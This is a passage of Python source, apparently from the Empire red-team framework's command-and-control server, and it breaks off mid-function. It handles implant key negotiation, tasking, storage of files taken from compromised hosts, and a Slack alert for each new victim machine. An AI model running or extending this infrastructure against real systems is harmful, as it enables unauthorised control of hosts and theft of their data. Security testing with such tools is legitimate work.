"""

Main agent handling functionality for Empire.

The Agents() class in instantiated in ./server.py by the main menu and includes:

    is_agent_present()          - returns True if an agent is present in the self.agents cache
    add_agent()                 - adds an agent to the self.agents cache and the backend database
    remove_agent_db()           - removes an agent from the self.agents cache and the backend database
    is_ip_allowed()             - checks if a supplied IP is allowed as per the whitelist/blacklist
    save_file()                 - saves a file download for an agent to the appropriately constructed path.
    save_module_file()          - saves a module output file to the appropriate path
    save_agent_log()            - saves the agent console output to the agent's log file
    is_agent_elevated()         - checks whether a specific sessionID is currently elevated
    get_agents_db()             - returns all active agents from the database
    get_agent_nonce_db()        - returns the nonce for this sessionID
    get_language_db()           - returns the language used by this agent
    get_agent_id_db()           - returns an agent sessionID based on the name
    get_agents_for_listener()   - returns all agent objects linked to a given listener name
    get_autoruns_db()           - returns any global script autoruns
    update_agent_sysinfo_db()   - updates agent system information in the database
    update_agent_lastseen_db()  - updates the agent's last seen timestamp in the database
    set_autoruns_db()           - sets the global script autorun in the config in the database
    clear_autoruns_db()         - clears the currently set global script autoruns in the config in the database
    handle_agent_staging()      - handles agent staging neogotiation
    handle_agent_data()         - takes raw agent data and processes it appropriately.
    handle_agent_request()      - return any encrypted tasks for the particular agent
    handle_agent_response()     - parses agent raw replies into structures
    process_agent_packet()      - processes agent reply structures appropriately

handle_agent_data() is the main function that should be used by external listener modules

Most methods utilize self.lock to deal with the concurreny issue of kicking off threaded listeners.

"""
import base64
import json
import logging
import os
import queue
import string
import threading
import time
import warnings
from pathlib import Path
from typing import Dict

from sqlalchemy import and_, or_
from sqlalchemy.orm import Session
from zlib_wrapper import decompress

from empire.server.api.v2.credential.credential_dto import CredentialPostRequest
from empire.server.common.helpers import KThread
from empire.server.common.socks import create_client, start_client
from empire.server.core.config import empire_config
from empire.server.core.db import models
from empire.server.core.db.base import SessionLocal
from empire.server.core.db.models import AgentTaskStatus
from empire.server.core.hooks import hooks
from empire.server.utils import datetime_util

from . import encryption, helpers, packets

log = logging.getLogger(__name__)


class Agents:
    """
    Main class that contains agent communication functionality, including key
    negotiation in process_get() and process_post().

    For managing agents use core/agent_service.py.
    """

    def __init__(self, MainMenu, args=None):
        # pull out the controller objects
        self.mainMenu = MainMenu
        self.installPath = self.mainMenu.installPath
        self.args = args
        self.socksthread = {}
        self.socksqueue = {}
        self.socksclient = {}

        # internal agent dictionary for the client's session key, funcions, and URI sets
        #   this is done to prevent database reads for extremely common tasks (like checking tasking URI existence)
        #   self.agents[sessionID] = {  'sessionKey' : clientSessionKey,
        #                               'language' : clientLanguage,
        #                               'functions' : [tab-completable function names for a script-import]
        #                            }
        self.agents = {}

        # used to protect self.agents and self.mainMenu.conn during threaded listener access
        self.lock = threading.Lock()

        # Since each agent logs to a different file, we can have multiple locks to reduce
        #  waiting time when writing to the file.
        self.agent_log_locks: Dict[str, threading.Lock] = {}

        # reinitialize any agents that already exist in the database
        db_agents = self.get_agents_db()
        for agent in db_agents:
            agentInfo = {
                "sessionKey": agent.session_key,
                "language": agent.language,
                "functions": agent.functions,
            }
            self.agents[agent["session_id"]] = agentInfo

        # pull out common configs from the main menu object in server.py
        self.ipWhiteList = self.mainMenu.ipWhiteList
        self.ipBlackList = self.mainMenu.ipBlackList

    ###############################################################
    #
    # Misc agent methods
    #
    ###############################################################

    @staticmethod
    def get_agent_from_name_or_session_id(agent_name, db: Session):
        return (
            db.query(models.Agent)
            .filter(
                or_(
                    models.Agent.name == agent_name,
                    models.Agent.session_id == agent_name,
                )
            )
            .first()
        )

    def is_agent_present(self, sessionID):
        """
        Checks if a given sessionID corresponds to an active agent.
        """
        warnings.warn(
            "This has been deprecated and may be removed."
            "Use agent_service.get_by_id() or agent_service.get_by_name() instead.",
            DeprecationWarning,
            stacklevel=2,
        )
        return sessionID in self.agents

    def add_agent(
        self,
        sessionID,
        externalIP,
        delay,
        jitter,
        profile,
        killDate,
        workingHours,
        lostLimit,
        sessionKey=None,
        nonce="",
        listener="",
        language="",
        db=None,
    ):
        """
        Add an agent to the internal cache and database.
        """
        # generate a new key for this agent if one wasn't supplied
        if not sessionKey:
            sessionKey = encryption.generate_aes_key()

        if not profile or profile == "":
            profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"

        # add the agent
        agent = models.Agent(
            name=sessionID,
            session_id=sessionID,
            delay=delay,
            jitter=jitter,
            external_ip=externalIP,
            session_key=sessionKey,
            nonce=nonce,
            profile=profile,
            kill_date=killDate,
            working_hours=workingHours,
            lost_limit=lostLimit,
            listener=listener,
            language=language.lower(),
            archived=False,
        )

        db.add(agent)
        self.update_agent_lastseen_db(sessionID, db)
        db.flush()

        message = f"New agent {sessionID} checked in"
        log.info(message)

        # initialize the tasking/result buffers along with the client session key
        self.agents[sessionID] = {
            "sessionKey": sessionKey,
            "language": agent.language.lower(),
            "functions": [],
        }

        return agent

    def remove_agent_db(self, session_id, db: Session):
        """
        Remove an agent to the internal cache and database.
        """
        # remove the agent from the internal cache
        self.agents.pop(session_id, None)

        # remove the agent from the database
        agent = (
            db.query(models.Agent).filter(models.Agent.session_id == session_id).first()
        )
        if agent:
            db.delete(agent)

        message = f"Agent {session_id} deleted"
        log.info(message)

    def is_ip_allowed(self, ip_address):
        """
        Check if the ip_address meshes with the whitelist/blacklist, if set.
        """
        if self.ipBlackList:
            if self.ipWhiteList:
                results = (
                    ip_address in self.ipWhiteList
                    and ip_address not in self.ipBlackList
                )
                return results
            else:
                results = ip_address not in self.ipBlackList
                return results
        if self.ipWhiteList:
            results = ip_address in self.ipWhiteList
            return results
        else:
            return True

    def save_file(
        self,
        sessionID,
        path,
        data,
        filesize,
        tasking: models.AgentTask,
        language: str,
        db: Session,
        append=False,
    ):
        """
        Save a file download for an agent to the appropriately constructed path.
        """
        # todo this doesn't work for non-windows. All files are stored flat.
        parts = path.split("\\")

        # construct the appropriate save path
        download_dir = Path(empire_config.directories.downloads)
        save_path = download_dir / sessionID / "/".join(parts[0:-1])
        filename = os.path.basename(parts[-1])
        save_file = save_path / filename

        try:
            self.lock.acquire()
            # fix for 'skywalker' exploit by @zeroSteiner
            # I'm not really sure if this can actually still be exploited, its gone through
            # quite a few refactors. But we'll keep it for now.
            safe_path = download_dir.absolute()
            if not str(save_file.absolute()).startswith(str(safe_path)):
                message = "Agent {} attempted skywalker exploit! Attempted overwrite of {} with data {}".format(
                    sessionID, path, data
                )
                log.warning(message)
                return

            # make the recursive directory structure if it doesn't already exist
            if not save_path.exists():
                os.makedirs(save_path)

            # overwrite an existing file
            mode = "ab" if append else "wb"
            f = save_file.open(mode)

            if "python" in language:
                log.info(
                    f"Compressed size of {filename} download: {helpers.get_file_size(data)}"
                )
                d = decompress.decompress()
                dec_data = d.dec_data(data)
                log.info(
                    f"Final size of {filename} wrote: {helpers.get_file_size(dec_data['data'])}"
                )
                if not dec_data["crc32_check"]:
                    message = f"File agent {sessionID} failed crc32 check during decompression!\n[!] HEADER: Start crc32: {dec_data['header_crc32']} -- Received crc32: {dec_data['dec_crc32']} -- Crc32 pass: {dec_data['crc32_check']}!"
                    log.warning(message)
                data = dec_data["data"]

            f.write(data)
            f.close()

            if not append:
                location = save_file
                download = models.Download(
                    location=str(location),
                    filename=filename,
                    size=os.path.getsize(location),
                )
                db.add(download)
                db.flush()
                tasking.downloads.append(download)

                # We join a Download to a Tasking
                # But we also join a Download to a AgentFile
                # This could be useful later on for showing files as downloaded directly in the file browser.
                agent_file = (
                    db.query(models.AgentFile)
                    .filter(
                        and_(
                            models.AgentFile.path == path,
                            models.AgentFile.session_id == sessionID,
                        )
                    )
                    .first()
                )

                if agent_file:
                    agent_file.downloads.append(download)
                    db.flush()
        finally:
            self.lock.release()

        percent = round(
            int(os.path.getsize(str(save_file))) / int(filesize) * 100,
            2,
        )

        # notify everyone that the file was downloaded
        message = f"Part of file {filename} from {sessionID} saved [{percent}%] to {save_path}"
        log.info(message)

    def save_module_file(self, sessionID, path, data, language: str):
        """
        Save a module output file to the appropriate path.
        """
        parts = path.split("/")

        # construct the appropriate save path
        download_dir = Path(empire_config.directories.downloads)
        save_path = download_dir / sessionID / "/".join(parts[0:-1])
        filename = parts[-1]
        save_file = save_path / filename

        # decompress data if coming from a python agent:
        if "python" in language:
            log.info(
                f"Compressed size of {filename} download: {helpers.get_file_size(data)}"
            )
            d = decompress.decompress()
            dec_data = d.dec_data(data)
            log.info(
                f"Final size of {filename} wrote: {helpers.get_file_size(dec_data['data'])}"
            )
            if not dec_data["crc32_check"]:
                message = f"File agent {sessionID} failed crc32 check during decompression!\n[!] HEADER: Start crc32: {dec_data['header_crc32']} -- Received crc32: {dec_data['dec_crc32']} -- Crc32 pass: {dec_data['crc32_check']}!"
                log.warning(message)
            data = dec_data["data"]

        try:
            self.lock.acquire()
            safe_path = download_dir.absolute()

            # fix for 'skywalker' exploit by @zeroSteiner
            # I'm not really sure if this can actually still be exploited, its gone through
            # quite a few refactors. But we'll keep it for now.
            if not str(save_file.absolute()).startswith(str(safe_path)):
                message = "agent {} attempted skywalker exploit!\n[!] attempted overwrite of {} with data {}".format(
                    sessionID, path, data
                )
                log.warning(message)
                return

            # make the recursive directory structure if it doesn't already exist
            if not save_path.exists():
                os.makedirs(save_path)

            # save the file out

            with save_file.open("wb") as f:
                f.write(data)
        finally:
            self.lock.release()

        # notify everyone that the file was downloaded
        message = f"File {path} from {sessionID} saved"
        log.info(message)

        return str(save_file)

    def save_agent_log(self, session_id, data):
        """
        Save the agent console output to the agent's log file.
        """
        if isinstance(data, bytes):
            data = data.decode("UTF-8")

        save_path = Path(empire_config.directories.downloads) / session_id

        # make the recursive directory structure if it doesn't already exist
        if not save_path.exists():
            os.makedirs(save_path)

        current_time = helpers.get_datetime()

        if session_id not in self.agent_log_locks:
            self.agent_log_locks[session_id] = threading.Lock()
        lock = self.agent_log_locks[session_id]

        with lock:
            with open(f"{save_path}/agent.log", "a") as f:
                f.write("\n" + current_time + " : " + "\n")
                f.write(data + "\n")

    ###############################################################
    #
    # Methods to get information from agent fields.
    #
    ###############################################################

    def is_agent_elevated(self, session_id):
        """
        Check whether a specific sessionID is currently elevated.
        This means root for OS X/Linux and high integrity for Windows.
        """
        warnings.warn(
            "This has been deprecated and may be removed."
            "Use agent_service.get_by_id() or agent_service.get_by_name() instead.",
            DeprecationWarning,
            stacklevel=2,
        )
        with SessionLocal() as db:
            elevated = (
                db.query(models.Agent.high_integrity)
                .filter(models.Agent.session_id == session_id)
                .scalar()
            )

            return elevated is True

    def get_agents_db(self):
        """
        Return all active agents from the database.
        """
        with SessionLocal() as db:
            results = db.query(models.Agent).all()

        return results

    def get_agent_nonce_db(self, session_id, db: Session):
        """
        Return the nonce for this sessionID.
        """
        warnings.warn(
            "This has been deprecated and may be removed."
            "Use agent_service.get_by_id() or agent_service.get_by_name() instead.",
            DeprecationWarning,
            stacklevel=2,
        )
        nonce = (
            db.query(models.Agent.nonce)
            .filter(models.Agent.session_id == session_id)
            .first()
        )

        if nonce and nonce is not None:
            if isinstance(nonce, str):
                return nonce
            else:
                return nonce[0]

    def get_language_db(self, session_id):
        """
        Return the language used by this agent.
        """
        warnings.warn(
            "This has been deprecated and may be removed."
            "Use agent_service.get_by_id() or agent_service.get_by_name() instead.",
            DeprecationWarning,
            stacklevel=2,
        )
        with SessionLocal() as db:
            # see if we were passed a name instead of an ID
            name_id = self.get_agent_id_db(session_id, db)
            if name_id:
                session_id = name_id

            language = (
                db.query(models.Agent.language)
                .filter(models.Agent.session_id == session_id)
                .scalar()
            )

        return language

    def get_agent_id_db(self, name, db: Session = None):
        """
        Get an agent sessionID based on the name.

        """
        warnings.warn(
            "This has been deprecated and may be removed."
            "Use agent_service.get_by_id() or agent_service.get_by_name() instead.",
            DeprecationWarning,
            stacklevel=2,
        )
        # db is optional for backwards compatibility until this function is phased out
        with db or SessionLocal() as db:
            agent = db.query(models.Agent).filter(models.Agent.name == name).first()

        if agent:
            return agent.session_id

        return None

    def get_agents_for_listener(self, listener_name):
        """
        Return agent objects linked to a given listener name.
        """
        warnings.warn(
            "This has been deprecated and may be removed."
            "Use agent_service.get_by_id() or agent_service.get_by_name() instead.",
            DeprecationWarning,
            stacklevel=2,
        )
        with SessionLocal() as db:
            agents = (
                db.query(models.Agent.session_id)
                .filter(models.Agent.listener == listener_name)
                .all()
            )

            return [a[0] for a in agents]

    def get_autoruns_db(self):
        """
        Return any global script autoruns.
        """
        warnings.warn(
            "This has been deprecated and may be removed."
            "Use agent_service.get_by_id() or agent_service.get_by_name() instead.",
            DeprecationWarning,
            stacklevel=2,
        )
        with SessionLocal() as db:
            results = db.query(models.Config.autorun_command).all()
            if results[0].autorun_command:
                autorun_command = results[0].autorun_command
            else:
                autorun_command = ""

            results = db.query(models.Config.autorun_data).all()
            if results[0].autorun_data:
                autorun_data = results[0].autorun_data
            else:
                autorun_data = ""

            autoruns = [autorun_command, autorun_data]

        return autoruns

    def update_dir_list(self, session_id, response, db: Session):
        """ "
        Update the directory list
        """
        if session_id in self.agents:
            # get existing files/dir that are in this directory.
            # delete them and their children to keep everything up to date. There's a cascading delete on the table.
            this_directory = (
                db.query(models.AgentFile)
                .filter(
                    and_(models.AgentFile.session_id == session_id),
                    models.AgentFile.path == response["directory_path"],
                )
                .first()
            )
            if this_directory:
                db.query(models.AgentFile).filter(
                    and_(
                        models.AgentFile.session_id == session_id,
                        models.AgentFile.parent_id == this_directory.id,
                    )
                ).delete()
            else:  # if the directory doesn't exist we have to create one
                # parent is None for now even though it might have one. This is self correcting.
                # If it's true parent is scraped, then this entry will get rewritten
                this_directory = models.AgentFile(
                    name=response["directory_name"],
                    path=response["directory_path"],
                    parent_id=None,
                    is_file=False,
                    session_id=session_id,
                )
                db.add(this_directory)
                db.flush()

            for item in response["items"]:
                db.query(models.AgentFile).filter(
                    and_(
                        models.AgentFile.session_id == session_id,
                        models.AgentFile.path == item["path"],
                    )
                ).delete()
                db.add(
                    models.AgentFile(
                        name=item["name"],
                        path=item["path"],
                        parent_id=None if not this_directory else this_directory.id,
                        is_file=item["is_file"],
                        session_id=session_id,
                    )
                )

    def update_agent_sysinfo_db(
        self,
        db,
        session_id,
        listener="",
        external_ip="",
        internal_ip="",
        username="",
        hostname="",
        os_details="",
        high_integrity=0,
        process_name="",
        process_id="",
        language_version="",
        language="",
        architecture="",
    ):
        """
        Update an agent's system information.
        """
        agent = (
            db.query(models.Agent).filter(models.Agent.session_id == session_id).first()
        )

        host = (
            db.query(models.Host)
            .filter(
                and_(
                    models.Host.name == hostname,
                    models.Host.internal_ip == internal_ip,
                )
            )
            .first()
        )
        if not host:
            host = models.Host(name=hostname, internal_ip=internal_ip)
            db.add(host)
            db.flush()

        process = (
            db.query(models.HostProcess)
            .filter(
                and_(
                    models.HostProcess.host_id == host.id,
                    models.HostProcess.process_id == process_id,
                )
            )
            .first()
        )
        if not process:
            process = models.HostProcess(
                host_id=host.id,
                process_id=process_id,
                process_name=process_name,
                user=agent.username,
            )
            db.add(process)
            db.flush()

        agent.internal_ip = internal_ip.split(" ")[0]
        agent.username = username
        agent.hostname = hostname
        agent.host_id = host.id
        agent.os_details = os_details
        agent.high_integrity = high_integrity
        agent.process_name = process_name
        agent.process_id = process_id
        agent.language_version = language_version
        agent.language = language
        agent.architecture = architecture
        db.flush()

    def update_agent_lastseen_db(self, session_id, db: Session):
        """
        Update the agent's last seen timestamp in the database.

        This checks to see if a timestamp already exists for the agent and ignores
        it if it does. It is not super efficient to check the database on every checkin.
        A better alternative would be to find a way to configure sqlalchemy to ignore
        duplicate inserts or do upserts.
        """
        checkin_time = datetime_util.getutcnow().replace(microsecond=0)
        exists = (
            db.query(models.AgentCheckIn)
            .filter(
                and_(
                    models.AgentCheckIn.agent_id == session_id,
                    models.AgentCheckIn.checkin_time == checkin_time,
                )
            )
            .first()
        )
        if not exists:
            db.add(models.AgentCheckIn(agent_id=session_id, checkin_time=checkin_time))

    def set_autoruns_db(self, task_command, module_data):
        """
        Set the global script autorun in the config in the database.
        """
        warnings.warn(
            "This has been deprecated and may be removed."
            "Use agent_service.get_by_id() or agent_service.get_by_name() instead.",
            DeprecationWarning,
            stacklevel=2,
        )
        try:
            with SessionLocal.begin() as db:
                config = db.query(models.Config).first()
                config.autorun_command = task_command
                config.autorun_data = module_data
        except Exception:
            log.error(
                "script autoruns not a database field, run --reset to reset DB schema."
            )
            log.warning("this will reset ALL agent connections!")

    def clear_autoruns_db(self):
        """
        Clear the currently set global script autoruns in the config in the database.
        """
        with SessionLocal.begin() as db:
            config = db.query(models.Config).first()
            config.autorun_command = ""
            config.autorun_data = ""

    ###############################################################
    #
    # Agent tasking methods
    #
    ###############################################################
    def get_queued_agent_tasks_db(self, session_id, db: Session):
        """
        Retrieve tasks that have been queued for our agent from the database.
        Set them to 'pulled'.
        """
        if session_id not in self.agents:
            log.error(f"Agent {session_id} not active.")
            return []
        else:
            try:
                tasks, total = self.mainMenu.agenttasksv2.get_tasks(
                    db=db,
                    agents=[session_id],
                    include_full_input=True,
                    status=AgentTaskStatus.queued,
                )

                for task in tasks:
                    task.status = AgentTaskStatus.pulled

                return tasks
            except AttributeError:
                log.warning("Agent checkin during initialization.")
                return []

    def get_queued_agent_temporary_tasks(self, session_id):
        """
        Retrieve temporary tasks that have been queued for our agent from the agenttasksv2.
        """
        if session_id not in self.agents:
            log.error(f"Agent {session_id} not active.")
            return []
        else:
            try:
                tasks = self.mainMenu.agenttasksv2.get_temporary_tasks_for_agent(
                    session_id
                )
                return tasks
            except AttributeError:
                log.warning("Agent checkin during initialization.")
                return []

    ###############################################################
    #
    # Agent staging/data processing components
    #
    ###############################################################

    def handle_agent_staging(
        self,
        sessionID,
        language,
        meta,
        additional,
        encData,
        stagingKey,
        listenerOptions,
        clientIP="0.0.0.0",
        db: Session = None,
    ):
        """
        Handles agent staging/key-negotiation.
        TODO: does this function need self.lock?
        """

        listenerName = listenerOptions["Name"]["Value"]

        if meta == "STAGE0":
            # step 1 of negotiation -> client requests staging code
            return "STAGE0"

        elif meta == "STAGE1":
            # step 3 of negotiation -> client posts public key
            message = f"Agent {sessionID} from {clientIP} posted public key"
            log.info(message)

            # decrypt the agent's public key
            try:
                message = encryption.aes_decrypt_and_verify(stagingKey, encData)
            except Exception:
                # if we have an error during decryption
                message = f"HMAC verification failed from '{sessionID}'"
                log.error(message, exc_info=True)
                return "ERROR: HMAC verification failed"

            if language.lower() == "powershell" or language.lower() == "csharp":
                # strip non-printable characters
                message = "".join(
                    [x for x in message.decode("UTF-8") if x in string.printable]
                )

                # client posts RSA key
                if (len(message) < 400) or (not message.endswith("</RSAKeyValue>")):
                    message = f"Invalid PowerShell key post format from {sessionID}"
                    log.error(message)
                    return "ERROR: Invalid PowerShell key post format"
                else:
                    # convert the RSA key from the stupid PowerShell export format
                    rsa_key = encryption.rsa_xml_to_key(message)

                    if rsa_key:
                        message = f"Agent {sessionID} from {clientIP} posted valid PowerShell RSA key"
                        log.info(message)

                        nonce = helpers.random_string(16, charset=string.digits)
                        delay = listenerOptions["DefaultDelay"]["Value"]
                        jitter = listenerOptions["DefaultJitter"]["Value"]
                        profile = listenerOptions["DefaultProfile"]["Value"]
                        killDate = listenerOptions["KillDate"]["Value"]
                        workingHours = listenerOptions["WorkingHours"]["Value"]
                        lostLimit = listenerOptions["DefaultLostLimit"]["Value"]

                        # add the agent to the database now that it's "checked in"
                        agent = self.add_agent(
                            sessionID,
                            clientIP,
                            delay,
                            jitter,
                            profile,
                            killDate,
                            workingHours,
                            lostLimit,
                            nonce=nonce,
                            listener=listenerName,
                            db=db,
                        )

                        client_session_key = agent.session_key
                        data = f"{nonce}{client_session_key}"

                        data = data.encode("ascii", "ignore")

                        # step 4 of negotiation -> server returns RSA(nonce+AESsession))
                        encrypted_msg = encryption.rsa_encrypt(rsa_key, data)
                        # TODO: wrap this in a routing packet!

                        return encrypted_msg

                    else:
                        message = f"Agent {sessionID} returned an invalid PowerShell public key!"
                        log.error(message)
                        return "ERROR: Invalid PowerShell public key"

            elif language.lower() == "python":
                if (len(message) < 1000) or (len(message) > 2500):
                    message = f"Invalid Python key post format from {sessionID}"
                    log.error(message)
                    return "Error: Invalid Python key post format from %s" % (sessionID)
                else:
                    try:
                        int(message)
                    except Exception:
                        message = f"Invalid Python key post format from {sessionID}"
                        log.error(message)
                        return message

                    # client posts PUBc key
                    clientPub = int(message)
                    serverPub = encryption.DiffieHellman()
                    serverPub.genKey(clientPub)
                    # serverPub.key == the negotiated session key

                    nonce = helpers.random_string(16, charset=string.digits)

                    message = (
                        f"Agent {sessionID} from {clientIP} posted valid Python PUB key"
                    )
                    log.info(message)

                    delay = listenerOptions["DefaultDelay"]["Value"]
                    jitter = listenerOptions["DefaultJitter"]["Value"]
                    profile = listenerOptions["DefaultProfile"]["Value"]
                    killDate = listenerOptions["KillDate"]["Value"]
                    workingHours = listenerOptions["WorkingHours"]["Value"]
                    lostLimit = listenerOptions["DefaultLostLimit"]["Value"]

                    # add the agent to the database now that it's "checked in"
                    self.add_agent(
                        sessionID,
                        clientIP,
                        delay,
                        jitter,
                        profile,
                        killDate,
                        workingHours,
                        lostLimit,
                        sessionKey=serverPub.key.hex(),
                        nonce=nonce,
                        listener=listenerName,
                        language=language,
                        db=db,
                    )

                    # step 4 of negotiation -> server returns HMAC(AESn(nonce+PUBs))
                    data = f"{nonce}{serverPub.publicKey}"
                    encrypted_msg = encryption.aes_encrypt_then_hmac(stagingKey, data)
                    # TODO: wrap this in a routing packet?

                    return encrypted_msg

            else:
                message = f"Agent {sessionID} from {clientIP} using an invalid language specification: {language}"
                log.info(message)
                return f"ERROR: invalid language: {language}"

        elif meta == "STAGE2":
            # step 5 of negotiation -> client posts nonce+sysinfo and requests agent
            try:
                session_key = self.agents[sessionID]["sessionKey"]
                if isinstance(session_key, str):
                    if language == "PYTHON":
                        session_key = bytes.fromhex(session_key)
                    else:
                        session_key = (self.agents[sessionID]["sessionKey"]).encode(
                            "UTF-8"
                        )

                message = encryption.aes_decrypt_and_verify(session_key, encData)
                parts = message.split(b"|")

                if len(parts) < 12:
                    message = f"Agent {sessionID} posted invalid sysinfo checkin format: {message}"
                    log.info(message)
                    # remove the agent from the cache/database
                    self.remove_agent_db(sessionID, db)
                    return message

                # verify the nonce
                if int(parts[0]) != (int(self.get_agent_nonce_db(sessionID, db)) + 1):
                    message = f"Invalid nonce returned from {sessionID}"
                    log.error(message)
                    self.remove_agent_db(sessionID, db)
                    return f"ERROR: Invalid nonce returned from {sessionID}"

                message = f"Nonce verified: agent {sessionID} posted valid sysinfo checkin format: {message}"
                log.debug(message)

                _listener = str(parts[1], "utf-8")
                domainname = str(parts[2], "utf-8")
                username = str(parts[3], "utf-8")
                hostname = str(parts[4], "utf-8")
                external_ip = clientIP
                internal_ip = str(parts[5], "utf-8")
                os_details = str(parts[6], "utf-8")
                high_integrity = str(parts[7], "utf-8")
                process_name = str(parts[8], "utf-8")
                process_id = str(parts[9], "utf-8")
                language = str(parts[10], "utf-8")
                language_version = str(parts[11], "utf-8")
                architecture = str(parts[12], "utf-8")
                if high_integrity == "True":
                    high_integrity = 1
                else:
                    high_integrity = 0

            except Exception as e:
                message = (
                    f"Exception in agents.handle_agent_staging() for {sessionID} : {e}"
                )
                log.error(message, exc_info=True)
                self.remove_agent_db(sessionID, db)
                return f"Error: Exception in agents.handle_agent_staging() for {sessionID} : {e}"

            if domainname and domainname.strip() != "":
                username = f"{domainname}\\{username}"

            # update the agent with this new information
            self.update_agent_sysinfo_db(
                db,
                sessionID,
                listener=listenerName,
                internal_ip=internal_ip,
                username=username,
                hostname=hostname,
                os_details=os_details,
                high_integrity=high_integrity,
                process_name=process_name,
                process_id=process_id,
                language_version=language_version,
                language=language,
                architecture=architecture,
            )

            # signal to Slack that this agent is now active

            slack_webhook_url = listenerOptions["SlackURL"]["Value"]
            if slack_webhook_url != "":
                slack_text = ":biohazard_sign: NEW AGENT :biohazard_sign:\r\n```Machine Name: {}\r\nInternal IP: {}\r\nExternal IP: {}\r\nUser: {}\r\nOS Version: {}\r\nAgent ID: {}```".format(
                    hostname,
                    internal_ip,
                    external_ip,
                    username,
                    os_details,
                    sessionID,
                )
                helpers.slackMessage(slack_webhook_url, slack_text)

            # signal everyone that this agent is now active
            message = f"Initial agent {sessionID} from {clientIP} now active (Slack)"
            log.info(message)

            hooks.run_hooks(
                hooks.AFTER_AGENT_CHECKIN_HOOK,
                db,
                self.get_agent_from_name_or_session_id(sessionID, db),
            )

            # save the initial sysinfo information in the agent log
            output = f"Agent {sessionID} now active"
            self.save_agent_log(sessionID, output)

            # if a script autorun is set, set that as the agent's first tasking
            # TODO VR autoruns haven't really worked in a while anyway...
            #  Would be nice to reintroduce it, but it's a little tricky in the
            #  multi-user architecture.
            # autorun = self.get_autoruns_db()
            # if autorun and autorun[0] != "" and autorun[1] != "":
            #     self.add_agent_task_db(sessionID, autorun[0], autorun[1])
            #
            # if (
            #     language.lower() in self.mainMenu.autoRuns
            #     and len(self.mainMenu.autoRuns[language.lower()]) > 0
            # ):
            #     autorunCmds = ["interact %s" % sessionID]
            #     autorunCmds.extend(self.mainMenu.autoRuns[language.lower()])
            #     autorunCmds.extend(["lastautoruncmd"])
            #     self.mainMenu.resourceQueue.extend(autorunCmds)
            #     try:
            #         # this will cause the cmdloop() to start processing the autoruns
            #         self.mainMenu.do_agents("kickit")
            #     except Exception as e:
            #         if e == "endautorun":
            #             pass
            #         else:
            #             log.info("End of Autorun Queue")

            return f"STAGE2: {sessionID}"

        else:
            message = f"Invalid staging request packet from {sessionID} at {clientIP} : {meta}"
            log.error(message)

    def handle_agent_data(
        self,
        stagingKey,
        routingPacket,
        listenerOptions,
        clientIP="0.0.0.0",
        update_lastseen=True,
    ):
        """
        Take the routing packet w/ raw encrypted data from an agent and
        process as appropriately.

        Abstracted out sufficiently for any listener module to use.
        """
        if len(routingPacket) < 20:
            message = (
                f"handle_agent_data(): routingPacket wrong length: {len(routingPacket)}"
            )
            log.error(message)
            return None

        if isinstance(routingPacket, str):
            routingPacket = routingPacket.encode("UTF-8")
        routingPacket = packets.parse_routing_packet(stagingKey, routingPacket)
        if not routingPacket:
            return [("", "ERROR: invalid routing packet")]

        dataToReturn = []

        # process each routing packet
        for sessionID, (language, meta, additional, encData) in routingPacket.items():
            if meta == "STAGE0" or meta == "STAGE1" or meta == "STAGE2":
                message = f"handle_agent_data(): sessionID {sessionID} issued a {meta} request"
                log.debug(message)

                with SessionLocal.begin() as db:
                    dataToReturn.append(
                        (
                            language,
                            self.handle_agent_staging(
                                sessionID,
                                language,
                                meta,
                                additional,
                                encData,
                                stagingKey,
                                listenerOptions,
                                clientIP,
                                db,
                            ),
                        )
                    )

            elif sessionID not in self.agents:
                message = f"handle_agent_data(): sessionID {sessionID} not present"
                log.warning(message)

                dataToReturn.append(("", f"ERROR: sessionID {sessionID} not in cache!"))

            elif meta == "TASKING_REQUEST":
                message = f"handle_agent_data(): sessionID {sessionID} issued a TASKING_REQUEST"
                log.debug(message)
                dataToReturn.append(
                    (
                        language,
                        self.handle_agent_request(sessionID, language, stagingKey),
                    )
                )

            elif meta == "RESULT_POST":
                message = (
                    f"handle_agent_data(): sessionID {sessionID} issued a RESULT_POST"
                )
                log.debug(message)
                dataToReturn.append(
                    (
                        language,
                        self.handle_agent_response(sessionID, encData, update_lastseen),
                    )
                )

            else:
                message = f"handle_agent_data(): sessionID {sessionID} gave unhandled meta tag in routing packet: {meta}"
                log.error(message)
        return dataToReturn

    def handle_agent_request(
        self, sessionID, language, stagingKey, update_lastseen=True
    ):
        """
        Update the agent's last seen time and return any encrypted taskings.

        TODO: does this need self.lock?
        """
        if sessionID not in self.agents:
            message = f"handle_agent_request(): sessionID {sessionID} not present"
            log.error(message)
            return None

        with SessionLocal.begin() as db:
            # update the client's last seen time
            # It's possible updating the last seen time over and over
            # contributes to write contention
            if update_lastseen:
                self.update_agent_lastseen_db(sessionID, db)

            # retrieve all agent taskings from the cache
            taskings = self.get_queued_agent_tasks_db(sessionID, db)
            temp_taskings = self.get_queued_agent_temporary_tasks(sessionID)
            taskings.extend(temp_taskings)

            if taskings and taskings != []:
                all_task_packets = b""

                # build tasking packets for everything we have
                for tasking in taskings:
                    input_full = tasking.input_full
                    if tasking.task_name == "TASK_CSHARP":
                        with open(tasking.input_full.split("|")[0], "rb") as f:
                            input_full = f.read()
                        input_full = base64.b64encode(input_full).decode("UTF-8")
                        input_full += tasking.input_full.split("|", maxsplit=1)[1]
                    all_task_packets += packets.build_task_packet(
                        tasking.task_name, input_full, tasking.id
                    )
                # get the session key for the agent
                session_key = self.agents[sessionID]["sessionKey"]

                if self.agents[sessionID]["language"].lower() in [
                    "python",
                    "ironpython",
                ]:
                    try:
                        session_key = bytes.fromhex(session_key)
                    except Exception:
                        pass

                # encrypt the tasking packets with the agent's session key
                encrypted_data = encryption.aes_encrypt_then_hmac(
                    session_key, all_task_packets
                )

                return packets.build_routing_packet(
                    stagingKey,
                    sessionID,
                    language,
                    meta="SERVER_RESPONSE",
                    encData=encrypted_data,
                )

        return None

    def handle_agent_response(self, sessionID, encData, update_lastseen=False):
        """
        Takes a sessionID and posted encrypted data response, decrypt
        everything and handle results as appropriate.

        TODO: does this need self.lock?
        """
        if sessionID not in self.agents:
            message = f"handle_agent_response(): sessionID {sessionID} not in cache"
            log.error(message)
            return None

        # extract the agent's session key
        sessionKey = self.agents[sessionID]["sessionKey"]

        if self.agents[sessionID]["language"].lower() in ["python", "ironpython"]:
            try:
                sessionKey = bytes.fromhex(sessionKey)
            except Exception:
                pass

        try:
            # verify, decrypt and depad the packet
            packet = encryption.aes_decrypt_and_verify(sessionKey, encData)

